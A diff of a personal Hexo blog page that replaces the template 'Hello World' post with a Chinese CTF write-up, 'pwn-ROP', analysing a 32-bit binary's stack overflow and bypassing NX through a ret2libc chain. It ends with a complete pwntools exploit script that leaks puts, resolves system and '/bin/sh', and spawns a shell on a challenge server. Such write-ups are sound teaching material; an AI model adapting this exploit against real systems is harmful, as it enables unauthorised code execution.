@@ -15,17 +15,20 @@
 
 
 
-<meta name="description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.">
+<meta name="description" content="pwn-ROP题目描述题目给出了两个有效信息，一个是远程连接的ip及端口号，另一个是libc下载的地址。">
+<meta name="keywords" content="pwn">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hello World">
-<meta property="og:url" content="https://hanqd.github.io/2019/03/15/hello-world/index.html">
+<meta property="og:title" content="pwn-ROP">
+<meta property="og:url" content="https://hanqd.github.io/2019/07/31/pwn-rop/index.html">
 <meta property="og:site_name" content="HANqd&#39;s BLOG">
-<meta property="og:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.">
+<meta property="og:description" content="pwn-ROP题目描述题目给出了两个有效信息，一个是远程连接的ip及端口号，另一个是libc下载的地址。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-03-16T04:18:31.716Z">
+<meta property="og:image" content="https://github.com/HANqd/IMG/raw/master/img/img/20.JPG">
+<meta property="og:updated_time" content="2019-07-31T03:41:31.567Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Hello World">
-<meta name="twitter:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.">
+<meta name="twitter:title" content="pwn-ROP">
+<meta name="twitter:description" content="pwn-ROP题目描述题目给出了两个有效信息，一个是远程连接的ip及端口号，另一个是libc下载的地址。">
+<meta name="twitter:image" content="https://github.com/HANqd/IMG/raw/master/img/img/20.JPG">
 
 <link rel="apple-touch-icon" href="/apple-touch-icon.png">
 
@@ -57,7 +60,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>Hello World | HANqd&#39;s BLOG</title>
+<title>pwn-ROP | HANqd&#39;s BLOG</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -267,11 +270,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我">
 </nav>
-      <div class="body-wrap"><article id="post-hello-world" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-pwn-rop" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2019/03/15/hello-world/" class="article-date">
-      <time datetime="2019-03-15T03:01:22.322Z" itemprop="datePublished">2019-03-15</time>
+      <a href="/2019/07/31/pwn-rop/" class="article-date">
+      <time datetime="2019-07-31T03:40:07.075Z" itemprop="datePublished">2019-07-31</time>
 </a>
 
 
@@ -286,7 +289,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      Hello World
+      pwn-ROP
     </h1>
   
 
@@ -296,6 +299,10 @@
         
 
         
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
+    </div>
+
         <div class="clearfix"></div>
       </div>
       
@@ -303,15 +310,37 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.<br><a id="more"></a></p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+        <h2 id="pwn-ROP"><a href="#pwn-ROP" class="headerlink" title="pwn-ROP"></a>pwn-ROP</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>题目给出了两个有效信息，一个是远程连接的ip及端口号，另一个是libc下载的地址。<br><a id="more"></a></p>
+<h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><ol>
+<li>下载pwn2，查看位数</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hdd@ubuntu:~/<span class="number">111</span>-oj/pwn2$ file pwn2</span><br><span class="line">pwn2: ELF <span class="number">32</span>-bit LSB executable, Intel <span class="number">80386</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib/ld-, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.32</span>, BuildID[sha1]=<span class="number">9517</span>a5e841a7db5fa03c618755241485162e3423, stripped</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li>用ida32打开pwn2，分析程序<br>mian函数：<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  sub_80484BB();</span><br><span class="line">  sub_80484EA();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>sub_80484BB()：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub_80484BB</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>sub_80484EA()：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> sub_80484EA()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-58h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"welcome to ROP world"</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0xC8</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>注意sub_80484EA()中的read函数，读入0xC8个字节到buf，但是分给buf的内存只有58h个字节，显然此处产生栈溢出漏洞。</p>
+<ol start="3">
+<li>检查保护机制</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hdd@ubuntu:~/<span class="number">111</span>-oj/pwn2$ checksec pwn2</span><br><span class="line">[*] '/home/hdd/111-oj/pwn2/pwn2'</span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span></span><br></pre></td></tr></table></figure>
+<p>开启NX保护，即栈保护，就不能像第一题那样直接向栈中注入代码来获取shell了，应该想办法绕过这些保护。<br>基础知识：参考<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/" title="Basic ROP" target="_blank" rel="noopener">Basic ROP</a> 。</p>
+<ol start="4">
+<li>查找system函数及/bin/sh字符串</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hdd@ubuntu:~/111-oj/pwn2$ ROPgadget --binary pwn2 --string '/bin/sh'</span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br></pre></td></tr></table></figure>
+<p>根据查找结果，发现程序中没有system函数和/bin/sh字符串。</p>
+<ol start="5">
+<li>常规ROP做题思路：<br>通过ROP泄漏libc的address(如puts_got)，计算system地址，然后返回到一个可以重现触发漏洞的位置(如main)，再次触发漏洞，通过ROP调用system(“/bin/sh”)。</li>
+</ol>
+<p>这里选择泄露puts函数的地址，puts函数的地址保存在got表中，而got表由plt表可以查找到，如下图所示：<br><img src="https://github.com/HANqd/IMG/raw/master/img/img/20.JPG" alt="plt got链接" title="plt got链接"></p>
+<ol start="6">
+<li>通过泄露的puts地址，可以查找到相应的libc版本，在libc中各个函数之间的偏移位置不变，可以通过计算出libc的基地址，再计算system和binsh的绝对地址。<br>计算公式：<br>已知puts_addr(上边已经得出)和libc中puts的地址，算出libc的基地址为<br>libcbase=puts_addr-libc.dump(‘puts’)，其中dump函数是一个libcSeacher工具里的一个方法，可以直接找到在libc中其对应函数的地址。<a href="https://github.com/lieanu/LibcSearcher" title="下载地址及用法" target="_blank" rel="noopener">libcSeacher下载地址及用法</a> 。<br>system_addr=libcbase+libc.dump(‘system’)<br>binsh_addr=libcbase+libc.dump(‘str_bin_sh’)</li>
+<li>脚本代码：</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">elf = ELF(<span class="string">'./pwn2'</span>)</span><br><span class="line">r = remote(<span class="string">'pwn1.blue-whale.me'</span>,<span class="number">9991</span>)</span><br><span class="line"></span><br><span class="line">//泄露puts地址</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">main = <span class="number">0x08048519</span></span><br><span class="line">paylaod = <span class="string">'a'</span>*<span class="number">92</span> + p32(puts_plt) + p32(main) + p32(puts_got)</span><br><span class="line">r.recvuntil(<span class="string">"welcome to ROP world\n"</span>)</span><br><span class="line">r.sendline(paylaod)</span><br><span class="line">puts_addr = u32(r.recv()[<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">"puts_addr:"</span>+hex(puts_addr)</span><br><span class="line"></span><br><span class="line">//根据已经泄露的puts地址，搜索相对应的libc版本</span><br><span class="line">libc=LibcSearcher(<span class="string">'puts'</span>,puts_addr)</span><br><span class="line"><span class="comment">#libc.dump("system")       </span></span><br><span class="line"><span class="comment">#libc.dump("str_bin_sh")    </span></span><br><span class="line"><span class="comment">#libc.dump("__libc_start_main_ret") </span></span><br><span class="line"><span class="comment">#print(libc)</span></span><br><span class="line"></span><br><span class="line">//根据libc中的偏移地址得到system和binsh的地址</span><br><span class="line">libcbase = puts_addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line">//构造填充数据，得到shell</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">92</span> + p32(system_addr) + <span class="string">'bbbb'</span> + p32(binsh_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -320,13 +349,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2019/03/15/hello-world/">Hello World</a></p>
+        <p><span>本文标题:</span><a href="/2019/07/31/pwn-rop/">pwn-ROP</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">HANqd</a></p>
-        <p><span>发布时间:</span>2019-03-15, 11:01:22</p>
-        <p><span>最后更新:</span>2019-03-16, 12:18:31</p>
+        <p><span>发布时间:</span>2019-07-31, 11:40:07</p>
+        <p><span>最后更新:</span>2019-07-31, 11:41:31</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2019/03/15/hello-world/" title="Hello World">https://hanqd.github.io/2019/03/15/hello-world/</a>
-            <span class="copy-path" data-clipboard-text="原文: https://hanqd.github.io/2019/03/15/hello-world/　　作者: HANqd" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2019/07/31/pwn-rop/" title="pwn-ROP">https://hanqd.github.io/2019/07/31/pwn-rop/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://hanqd.github.io/2019/07/31/pwn-rop/　　作者: HANqd" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -338,12 +367,12 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2019/03/15/你好，hexo/">
-                    你好，hexo
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2019/07/22/pwnable leg/">
+                    pwnable.kr-leg
                 </a>
             </div>
-        
         
     </nav>
 
@@ -353,7 +382,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Quick-Start"><span class="toc-number">1.</span> <span class="toc-text">Quick Start</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Create-a-new-post"><span class="toc-number">1.1.</span> <span class="toc-text">Create a new post</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Run-server"><span class="toc-number">1.2.</span> <span class="toc-text">Run server</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Generate-static-files"><span class="toc-number">1.3.</span> <span class="toc-text">Generate static files</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Deploy-to-remote-sites"><span class="toc-number">1.4.</span> <span class="toc-text">Deploy to remote sites</span></a></li></ol></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#pwn-ROP"><span class="toc-number">1.</span> <span class="toc-text">pwn-ROP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#题目描述"><span class="toc-number">1.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#题目分析"><span class="toc-number">1.2.</span> <span class="toc-text">题目分析</span></a></li></ol></li></ol>
         
     </div>
     <style>
@@ -389,7 +418,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"Hello World　| HANqd's BLOG　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"pwn-ROP　| HANqd's BLOG　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -405,7 +434,7 @@
     
       <div class="duoshuo" id="comments">
     <div id="comment-box"></div>
-    <div class="ds-thread" id="ds-thread" data-thread-key="2019/03/15/hello-world/" data-title="Hello World" data-url="https://hanqd.github.io/2019/03/15/hello-world/"></div>
+    <div class="ds-thread" id="ds-thread" data-thread-key="2019/07/31/pwn-rop/" data-title="pwn-ROP" data-url="https://hanqd.github.io/2019/07/31/pwn-rop/"></div>
     <script>
         var duoshuoQuery = {short_name:""};
         var loadComment = function(){
@@ -428,15 +457,15 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2019/03/15/你好，hexo/" title="上一篇: 你好，hexo">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+            <a href="/2019/07/22/pwnable leg/" title="下一篇: pwnable.kr-leg">
+                <i class="fa fa-angle-right"></i>
+            </a>
         
     </div>
 
